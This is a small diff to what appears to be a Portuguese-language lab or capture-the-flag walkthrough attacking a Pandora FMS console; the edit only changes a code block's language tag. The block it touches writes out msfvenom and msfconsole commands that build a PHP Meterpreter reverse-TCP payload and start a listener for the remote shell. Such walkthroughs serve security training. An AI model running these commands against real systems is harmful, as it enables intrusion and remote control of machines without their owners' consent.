@@ -75,7 +75,7 @@ http://127.0.0.1/pandora_console/
 
 8. Crie o payload e inicie o multi handler
 
-````php
+````bash
 $ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o payload.php
 $ msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LPORT 4444; set LHOST tun0; exploit"
 ````
